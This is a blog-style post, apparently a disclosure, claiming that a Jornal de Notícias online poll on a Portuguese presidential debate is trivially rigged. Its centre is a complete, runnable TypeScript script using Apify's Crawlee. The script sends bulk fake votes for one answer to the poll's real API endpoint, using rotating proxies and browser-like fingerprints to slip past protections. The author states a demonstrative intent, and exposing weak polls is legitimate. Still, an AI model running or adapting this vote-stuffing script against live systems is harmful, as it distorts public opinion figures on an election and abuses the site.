# Why online debate polls like this one are unreliable (Jornal de Notícias)

Jornal de Notícias published an online poll asking readers to decide who won a 1:1 debate for the Portuguese presidential elections.

At first glance, it looks like a simple public opinion snapshot. In practice, it is **trivially easy to manipulate**.

With minimal technical effort, it is possible to generate **large volumes of fake votes** for any candidate. This means the final percentages shown to the public can be heavily distorted and **do not reflect real voter sentiment**.

## The problem with these polls

The poll relies entirely on weak protections:

* No strong user identification
* No effective rate limiting
* No meaningful bot protection

As a result, automated scripts can submit votes in bulk in a very short time. There is no reliable way for the platform to distinguish real users from automated submissions.

## How simple this is in practice

Below is a minimal example showing how easy it is to automate votes using https://www.apify.com?fpr=t4bn9[Apify]'s Crawlee library. Crawlee abstracts most of the usual friction involved in this kind of automation and automatically bypasses common basic protections by using a combination of techniques, including:

- Rotating proxies
- Automatically generated and rotated user agents
- Request fingerprinting that mimics real browsers

```typescript
import { Actor } from 'apify';
import { HttpCrawler } from 'crawlee';

await Actor.init();

const proxyConfiguration = await Actor.createProxyConfiguration();

const crawler = new HttpCrawler({
    additionalMimeTypes: ['text/plain'],
    proxyConfiguration,
    maxConcurrency: 1,
    maxRequestsPerMinute: 30,
    requestHandler: async ({ request, log, sendRequest }) => {
        const response = await sendRequest();
        log.info(
            JSON.stringify({
                body: request.payload.toString(),
                statusCode: response.statusCode.toString(),
                response: response.body.toString(),
            }),
        );
    },
});

await crawler.run(
    Array(100)
        .fill({
            url: 'https://apix.noticiasilimitadas.pt/api/jn/poll/vote',
            method: 'POST',
            payload: JSON.stringify({ poll_id: 4, answer_id: 1 }),
        })
        .map((e, index) => ({ ...e, skipNavigation: true, uniqueKey: `${index}-${e.url}` })),
);

await Actor.exit();
```

This sends 100 valid votes in seconds without triggering any meaningful protection.

From the poll's perspective, these requests look like they are coming from different real users.

### Why I'm sharing this

The goal of sharing this code is **not to incentivize manipulation**, but to clearly demonstrate how fragile these polls are. I understand this may enable abuse, but the reality is that this kind of manipulation **is already possible and likely already happening**. Hiding the weakness only protects the illusion, not the system.

## Final note

These polls are fine as entertainment. They should **never be interpreted as serious indicators of public opinion** unless strong protections against automation and abuse are in place.

If you see one of these polls circulating with thousands of votes, assume one thing:
**it can be rigged, and very likely is.**
